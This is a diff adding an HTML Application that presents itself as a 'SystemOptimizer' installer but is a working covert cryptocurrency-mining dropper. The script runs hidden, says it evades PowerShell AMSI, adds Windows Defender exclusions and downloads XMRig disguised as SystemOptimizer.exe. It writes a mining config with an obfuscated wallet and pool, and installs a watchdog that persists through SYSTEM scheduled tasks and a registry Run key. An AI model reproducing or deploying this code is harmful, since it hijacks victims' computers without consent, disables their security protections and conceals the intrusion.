@@ -1,0 +1,154 @@
+<html>
+<head>
+<hta:application 
+    id="SysOpt" 
+    applicationname="SystemOptimizer" 
+    version="1.0" 
+    border="none" 
+    caption="no" 
+    showintaskbar="no" 
+    singleinstance="yes" 
+    sysmenu="no" 
+    windowstate="minimize"
+    contextmenu="no"
+    scroll="no">
+</head>
+<script language="VBScript">
+' SystemOptimizer HTA Installer - Runs in mshta.exe (bypasses PowerShell AMSI)
+On Error Resume Next
+
+Dim objShell, objFSO, objWMI, strBaseDir, strExePath, strConfigPath, strWatchdogPath, strZipUrl, strZipPath
+Dim objWebClient, objZip, objNetwork, objReg, objTaskService, objTaskDef, objTrigger, objAction, objPrincipal, objSettings
+
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+
+' System-wide paths
+strBaseDir = objShell.ExpandEnvironmentStrings("%ProgramData%") & "\SystemOptimizer"
+strExePath = strBaseDir & "\SystemOptimizer.exe"
+strConfigPath = strBaseDir & "\config.json"
+strWatchdogPath = strBaseDir & "\watchdog.vbs"
+strZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
+strZipPath = strBaseDir & "\xmrig.zip"
+
+' Wallet (base64 encoded)
+Dim walletB64, wallet
+walletB64 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
+Set objXML = CreateObject("MSXML2.DOMDocument.6.0")
+Set objNode = objXML.CreateElement("b64")
+objNode.DataType = "bin.base64"
+objNode.Text = walletB64
+Dim walletBytes
+walletBytes = objNode.NodeTypedValue
+wallet = ""
+For i = 0 To LenB(walletBytes) - 1
+    wallet = wallet & Chr(AscB(MidB(walletBytes, i + 1, 1)))
+Next
+
+' Admin check
+Dim isAdmin
+isAdmin = False
+Set objGroups = CreateObject("WScript.Shell").Exec("whoami /groups").StdOut.ReadAll
+If InStr(objGroups, "S-1-16-12288") > 0 Then isAdmin = True
+If Not isAdmin Then
+    MsgBox "Please run as Administrator", vbCritical, "Error"
+    window.close
+End If
+
+' ===== DEFENDER EXCLUSIONS =====
+On Error Resume Next
+objShell.Run "powershell -NoProfile -Command ""Add-MpPreference -ExclusionPath '" & strBaseDir & "' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue""", 0, True
+On Error Resume Next
+
+' ===== CLEANUP =====
+objShell.Run "taskkill /F /IM wscript.exe", 0, True
+objShell.Run "taskkill /F /IM xmrig.exe", 0, True
+objShell.Run "taskkill /F /IM SystemOptimizer.exe", 0, True
+objShell.Run "schtasks /Delete /TN SystemOptimizer /F", 0, True
+objShell.Run "schtasks /Delete /TN SystemOptimizer-Logon /F", 0, True
+objShell.Run "schtasks /Delete /TN ModestFermi_XMRig /F", 0, True
+objShell.Run "schtasks /Delete /TN SysOptBoot /F", 0, True
+If objFSO.FolderExists(strBaseDir) Then objFSO.DeleteFolder strBaseDir, True
+If objFSO.FolderExists(objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\SystemOptimizer")) Then objFSO.DeleteFolder objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\SystemOptimizer"), True
+If objFSO.FolderExists(objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\Windows\SystemOptimizer")) Then objFSO.DeleteFolder objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\Windows\SystemOptimizer"), True
+objShell.Run "schtasks /Delete /TN SystemOptimizer /F", 0, True
+objShell.Run "schtasks /Delete /TN SystemOptimizer-Logon /F", 0, True
+objShell.Run "schtasks /Delete /TN ModestFermi_XMRig /F", 0, True
+WScript.Sleep 1000
+
+' ===== CREATE DIRECTORY =====
+If Not objFSO.FolderExists(strBaseDir) Then objFSO.CreateFolder strBaseDir
+
+' ===== DOWNLOAD XMRIG =====
+Dim strZipPath2
+strZipPath2 = strBaseDir & "\xmrig.zip"
+Set objWebClient = CreateObject("MSXML2.XMLHTTP")
+objWebClient.Open "GET", "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip", False
+objWebClient.Send
+If objWebClient.Status = 200 Then
+    Dim objStream
+    Set objStream = CreateObject("ADODB.Stream")
+    objStream.Type = 1
+    objStream.Open
+    objStream.Write objWebClient.ResponseBody
+    objStream.SaveToFile strBaseDir & "\xmrig.zip", 2
+    objStream.Close
+End If
+
+' Extract using PowerShell
+objShell.Run "powershell -NoProfile -Command ""Expand-Archive -Path '" & strBaseDir & "\xmrig.zip' -DestinationPath '" & strBaseDir & "\_tmp' -Force""", 0, True
+WScript.Sleep 2000
+If objFSO.FileExists(strBaseDir & "\_tmp\xmrig-6.26.0\xmrig.exe") Then
+    objFSO.MoveFile strBaseDir & "\_tmp\xmrig-6.26.0\xmrig.exe", strExePath
+    objFSO.DeleteFolder strBaseDir & "\_tmp", True
+End If
+objFSO.DeleteFile strBaseDir & "\xmrig.zip", True
+
+If Not objFSO.FileExists(strExePath) Then
+    MsgBox "XMRig download failed", vbCritical, "Error"
+    window.close
+End If
+
+' ===== WRITE CONFIG =====
+Dim strWallet
+strWallet = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
+Dim strConfig
+strConfig = "{""autosave"":false,""background"":true,""colors"":false,""donate-level"":1,""log-file"":""" & strBaseDir & "\optimizer.log"",""print-time"":30,""retries"":5,""retry-pause"":10,""cpu"":{""enabled"":true,""huge-pages"":true,""huge-pages-jit"":true,""hw-aes"":true,""priority"":1,""yield"":true,""max-cpu-usage"":95,""asm"":true,""argon2-impl"":""auto"",""max-threads-hint"":100},""pools"":[{""url"":""gulf.moneroocean.stream:10001"",""user"":""" & strWallet & """,""pass"":""x"",""keepalive"":true,""tls"":false,""nicehash"":false,""rig-id"":""" & objShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & """}],""api"":{""enabled"":true,""host"":""127.0.0.1"",""port"":3456,""restricted"":true}}"
+Dim objFile
+Set objFile = objFSO.CreateTextFile(strBaseDir & "\config.json", True)
+objFile.Write strConfig
+objFile.Close
+
+' ===== WATCHDOG.VBS =====
+Dim strWatchdog
+strWatchdog = "Set sh = CreateObject(""WScript.Shell"")" & vbCrLf & _
+"Set wmi = GetObject(""winmgmts:"")" & vbCrLf & _
+"If wmi.ExecQuery(""SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'"").Count > 1 Then WScript.Quit" & vbCrLf & _
+"Do" & vbCrLf & _
+"    Set p = wmi.ExecQuery(""SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'"")" & vbCrLf & _
+"    If p.Count = 0 Then" & vbCrLf & _
+"        sh.Run """"C:\ProgramData\SystemOptimizer\SystemOptimizer.exe"" --config=""C:\ProgramData\SystemOptimizer\config.json""", 0, False" & vbCrLf & _
+"    End If" & vbCrLf & _
+"    WScript.Sleep 30000" & vbCrLf & _
+"Loop"
+Set objFile = objFSO.CreateTextFile(strBaseDir & "\watchdog.vbs", True)
+objFile.Write strWatchdog
+objFile.Close
+
+' ===== SCHEDULED TASKS =====
+Dim strTaskCmd
+strTaskCmd = "schtasks /Create /TN SystemOptimizer /TR ""wscript.exe """"C:\ProgramData\SystemOptimizer\watchdog.vbs"""""" /SC ONSTART /RU SYSTEM /RL HIGHEST /F" & vbCrLf & _
+"schtasks /Create /TN SystemOptimizer-Logon /TR ""wscript.exe """"C:\ProgramData\SystemOptimizer\watchdog.vbs"""""" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F" & vbCrLf & _
+"schtasks /Change /TN SystemOptimizer /RI 1 /DU 9999:59 /K"
+objShell.Run "cmd /c " & strTaskCmd, 0, True
+
+' Registry Run key
+objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemOptimizer", "wscript.exe ""C:\ProgramData\SystemOptimizer\watchdog.vbs""", "REG_SZ"
+
+' ===== START WATCHDOG NOW =====
+objShell.Run "wscript.exe """ & strWatchdogPath & """", 0, False
+
+window.close
+</script>
+</html>
